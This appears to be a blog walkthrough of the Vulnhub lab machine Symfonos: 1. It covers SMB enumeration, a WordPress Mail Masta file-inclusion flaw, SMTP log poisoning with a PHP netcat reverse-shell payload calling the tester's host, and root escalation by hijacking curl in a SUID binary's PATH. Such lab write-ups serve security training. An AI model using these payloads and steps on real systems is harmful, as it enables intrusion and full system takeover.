@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Symfonos: 1 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Symfonos: 1 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2019-08-08-vulnhub_symfonos1_writeup/">Symfonos: 1 - Writeup</a></h4>
+    <h5>August 8, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="symfonos-1-writeup">Symfonos: 1 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>A great OSCP-like machine! It requires anonymous authentication on SMB, which leads to a hint. With that hint, a directory can be found on the web server, that leads to a Wordpress blog. This blog has several plugins installed, where two of them lead to local file inclusion. With log injection, the LFI turns into a remote code execution and system access is granted. Privilege escalation is done via an SUID bit enabled binary, that calls curl within. After modifying the PATH variable and providing an own malicious version of curl, root user access is also granted.</p>
+
+<h2 id="identifying-the-host">Identifying the host</h2>
+
+<p>As always, let&rsquo;s start with finding out, on which IP the victim machine is.</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nmap -sn 192.168.178.*
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-08 05:38 EDT
+Nmap scan report for fritz.box (192.168.178.1)
+Host is up (0.0033s latency).
+...
+Nmap scan report for symfonos (192.168.178.29)
+Host is up (0.0022s latency).
+MAC Address: 08:00:27:4F:C9:31 (Oracle VirtualBox virtual NIC)
+...
+</code></pre>
+
+<h2 id="port-scan">Port Scan</h2>
+
+<p>The second step is to run <code>nmap</code> on all ports, to see, which ports are open:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nmap -p- -oA all_tcp_ports 192.168.178.29
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-08 05:40 EDT
+Nmap scan report for symfonos.fritz.box (192.168.178.29)
+Host is up (0.0033s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:4F:C9:31 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 25.10 seconds
+</code></pre>
+
+<p>We can see, that port 139 and 445 are open, which means, that SMB is available. Now let&rsquo;s focus on this one first.</p>
+
+<h2 id="smb">SMB</h2>
+
+<p>We have to find out, which shares are avaibale through SMB. Therefore, we can use <code>smbclient</code> with the <code>-L</code> option, to list all available shares. As we want to try a null session authentication, we just skip entering a password:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# smbclient -L //192.168.178.29/
+Enter WORKGROUP\root's password:
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    helios          Disk      Helios personal share
+    anonymous       Disk      
+    IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            SYMFONOS
+</code></pre>
+
+<p>We can see, that <code>helios</code> and <code>anonymous</code> shares are available. The share <code>helios</code> requires a password, which we don&rsquo;t have yet, but <code>anonymous</code> doesn&rsquo;t require anything. There is a file called <code>attention.txt</code> available, which we can download. After inspecting this file, it turns out, that some users obviously annoyed Zeus by using a few passwords.</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# smbclient //192.168.178.29/anonymous
+Enter WORKGROUP\root's password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Jun 28 21:14:49 2019
+  ..                                  D        0  Fri Jun 28 21:12:15 2019
+  attention.txt                       N      154  Fri Jun 28 21:14:49 2019
+
+        19994224 blocks of size 1024. 17282368 blocks available
+smb: \&gt; get attention.txt
+getting file \attention.txt of size 154 as attention.txt (13.7 KiloBytes/sec) (average 13.7 KiloBytes/sec)
+^C
+
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# cat attention.txt
+
+Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
+
+Next person I find using one of these passwords will be fired!
+
+-Zeus
+</code></pre>
+
+<p>After trying those passwords on the share <code>helios</code>, with the same username, <code>qwerty</code> seems to be the one to go. We get two additional files, whereas the todo.txt file reveals a directory on the webserver:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# smbclient //192.168.178.29/helios -U helios
+Enter WORKGROUP\helios's password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Jun 28 20:32:05 2019
+  ..                                  D        0  Fri Jun 28 20:37:04 2019
+  research.txt                        A      432  Fri Jun 28 20:32:05 2019
+  todo.txt                            A       52  Fri Jun 28 20:32:05 2019
+
+        19994224 blocks of size 1024. 17283724 blocks available
+smb: \&gt; get research.txt
+getting file \research.txt of size 432 as research.txt (38.4 KiloBytes/sec) (average 38.4 KiloBytes/sec)
+smb: \&gt; get todo.txt
+getting file \todo.txt of size 52 as todo.txt (3.9 KiloBytes/sec) (average 19.7 KiloBytes/sec)
+^C
+
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# cat research.txt
+Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# cat todo.txt
+
+1. Binge watch Dexter
+2. Dance
+3. Work on /h3l105
+</code></pre>
+
+<h2 id="port-80">Port 80</h2>
+
+<p>After adding <code>symfonos.local</code> to <code>/etc/hosts</code> and visiting the directory <code>/h3l105</code>, we can see, that it is a Wordpress blog. We can use <code>wpscan</code> with the option <code>-e vp</code> to enumerate vulnerable plugins:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# wpscan --url http://symfonos.local/h3l105/ -e vp
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.6.1
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://symfonos.local/h3l105/
+[+] Started: Thu Aug  8 06:45:40 2019
+...
+[+] mail-masta
+ | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Detected By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/8609
+ |      - https://www.exploit-db.com/exploits/40290/
+ |      - https://cxsecurity.com/issue/WLB-2016080220
+ |
+ | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/8740
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
+ |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
+ |
+ | Version: 1.0 (100% confidence)
+ | Detected By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
+...
+
+[+] Finished: Thu Aug  8 06:45:45 2019
+[+] Requests Done: 1
+[+] Cached Requests: 36
+[+] Data Sent: 300 B
+[+] Data Received: 617 B
+[+] Memory used: 164.578 MB
+[+] Elapsed time: 00:00:04
+</code></pre>
+
+<p>We can see, that the blog has a plugin installed, which is vulnerable to local file inclusion (LFI). Visiting <code>https://wpvulndb.com/vulnerabilities/8609</code> shows, how to exploit this vulnerability.</p>
+
+<h2 id="lfi-to-rce">LFI to RCE</h2>
+
+<p>With the following url, we can read files:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+helios:x:1000:1000:,,,:/home/helios:/bin/bash
+...
+</code></pre>
+
+<p>We can turn LFI into remote code execution, with injecting some log file and read them. When looking at our port scan result, we can see, that the smtp port 25 is open. We can connect to that port via <code>nc</code> and send a mail to user helios. This mail will include a payload, that triggers a reverse shell, when reading it through the LFI vulnerability:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nc -vvvv symfonos.local 25
+symfonos.local [192.168.178.20] 25 (smtp) open
+mail from: 0x23b
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+250 2.1.0 Ok
+rcpt to: helios
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.178.51 443 &gt; /tmp/f&quot;); ?&gt;
+.
+250 2.0.0 Ok: queued as E668640B8C
+quit
+221 2.0.0 Bye
+ sent 147, rcvd 169
+</code></pre>
+
+<p>Next we have to setup our netcat listener on port 443 and read <code>/var/mail/helios</code> through the vulnerability:</p>
+
+<pre><code class="language-bash">root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
+...
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.178.51] from (UNKNOWN) [192.168.178.20] 38558
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+</code></pre>
+
+<p>And we get our reverse shell! After upgrading the shell to a full tty, we can go further with privilege escalation:</p>
+
+<pre><code class="language-bash">$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+&lt;h3l105/wp-content/plugins/mail-masta/inc/campaign$ ^Z
+[1]+  Stopped                 nc -lvnp 443
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# stty raw -echo
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nc -lvnp 443
+
+&lt;h3l105/wp-content/plugins/mail-masta/inc/campaign$ stty columns 288
+&lt;h3l105/wp-content/plugins/mail-masta/inc/campaign$ stty rows 55    
+helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>After listing all SUID enabled binaries, we can see something, which normally does not belong to this list:</p>
+
+<pre><code class="language-bash">helios@symfonos:/tmp$ find / -perm -4000 2&gt;/dev/null
+...
+/opt/statuscheck
+...
+helios@symfonos:/tmp$ ls -la /opt/statuscheck
+-rwsr-xr-x 1 root root 8640 Jun 28 20:21 /opt/statuscheck
+</code></pre>
+
+<p>Inspecting further with <code>strings</code> reveals, that this binary calls <code>curl</code>.</p>
+
+<pre><code class="language-bash">helios@symfonos:/tmp$ strings /opt/statuscheck
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+...
+curl -I H
+http://lH
+ocalhostH
+AWAVA
+AUATL
+...
+</code></pre>
+
+<p>The vulnerability is, that <code>curl</code> will be called directly, as no absolute path was given. After checking our PATH environment variable, we can append <code>/tmp</code> to the beginning of that variable, so that the system checks first that location, in order to call <code>curl</code>.</p>
+
+<pre><code class="language-bash">helios@symfonos:/etc$ which curl             
+/usr/bin/curl
+helios@symfonos:/etc$ env
+...
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+...
+helios@symfonos:/etc$ cd /tmp
+helios@symfonos:/tmp$ export PATH=/tmp:$PATH
+</code></pre>
+
+<p>We now have to provide our own version of <code>curl</code>. We write a small program, which executes <code>/bin/sh</code> with the gid and uid of user root:</p>
+
+<pre><code class="language-c">int main(void) {
+       setgid(0); setuid(0);
+       execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);
+}
+</code></pre>
+
+<p>After naming that file <code>curl.c</code>, we can compile it with <code>gcc</code>:</p>
+
+<pre><code class="language-bash">helios@symfonos:/tmp$ gcc curl.c -o curl
+curl.c: In function 'main':
+curl.c:2:8: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
+        setgid(0); setuid(0);
+        ^~~~~~
+curl.c:2:19: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
+        setgid(0); setuid(0);
+                   ^~~~~~
+curl.c:3:8: warning: implicit declaration of function 'execl' [-Wimplicit-function-declaration]
+        execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);
+        ^~~~~
+curl.c:3:8: warning: incompatible implicit declaration of built-in function 'execl'
+</code></pre>
+
+<p>All we have to do now, is to execute <code>/opt/statuscheck</code>:</p>
+
+<pre><code class="language-bash">helios@symfonos:/tmp$ /opt/statuscheck
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(helios)
+# cat /root/proof.txt
+
+    Congrats on rooting symfonos:1!
+
+                 \ __
+--==/////////////[})))==*
+                 / \ '          ,|
+                    `\`\      //|                             ,|
+                      \ `\  //,/'                           -~ |
+   )             _-~~~\  |/ / |'|                       _-~  / ,
+  ((            /' )   | \ / /'/                    _-~   _/_-~|
+ (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
+ ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/,
+((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
+ ((\~\           |    )   | '      /        __--~~  \-~~ _-~
+    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
+     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~
+      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
+                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
+                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
+                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
+                  ;;;;'     (      ---~~/         `:::|       `\\.      
+                  |'  _      `----~~~~'      /      `:|        ()))),      
+            ______/\/~    |                 /        /         (((((())  
+          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
+         / //  _;______;'------~~~~~    |;;/\    /                ((   (
+        //  \ \                        /  |  \;;,\                 `   
+       (&lt;_    \ \                    /',/-----'  _&gt;
+        \_|     \\_                 //~;~~~~~~~~~
+                 \_|               (,~~   
+                                    \~\
+                                     ~~
+
+    Contact me via Twitter @zayotic to give feedback!
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
